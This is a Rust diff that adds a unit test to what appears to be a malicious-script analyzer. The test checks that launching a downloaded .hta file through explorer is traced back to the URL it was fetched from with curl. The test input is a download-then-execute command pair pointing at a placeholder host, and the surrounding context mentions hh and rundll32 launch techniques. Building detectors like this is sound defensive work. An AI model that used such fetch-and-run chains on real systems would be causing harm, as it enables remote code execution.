@@ -7051,6 +7051,27 @@ hh payload.chm"#,
     }
 
     #[test]
+    fn explorer_local_target_resolves_prior_download_source_url() {
+        let report = crate::analyze(
+            br#"curl -o payload.hta https://explorer-local-source.example/payload.hta
+explorer payload.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "explorer payload.hta"
+                            && url == "https://explorer-local-source.example/payload.hta"
+                )
+            }),
+            "Explorer local target did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn rundll32_fileprotocolhandler_schemeless_url_emits_url_launch() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
